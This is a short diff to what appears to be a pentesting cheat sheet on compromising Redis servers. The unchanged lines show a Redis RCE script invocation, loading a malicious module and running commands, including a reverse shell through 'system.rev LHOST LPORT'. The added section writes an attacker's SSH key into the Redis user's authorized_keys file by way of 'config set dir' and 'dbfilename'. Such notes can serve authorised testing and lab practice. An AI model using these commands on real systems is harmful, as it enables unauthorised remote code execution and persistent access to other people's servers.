@@ -17,7 +17,6 @@ python3 redis-rce.py -r <remote-ip> -p <port> -L <local-ip> -f ../RedisModules-E
 ```
 
 ## Load Module
-
 ```
 MODULE LOAD /path/to/module.so
 system.exec "whoami"
@@ -26,6 +25,12 @@ system.rev LHOST LPORT
 [HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)
 
 ## Write to File
+```
+cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
+config set dir /var/lib/redis/.ssh
+config set dbfilename "authorized_keys"
+save
+```
 
 
 ## Hydra
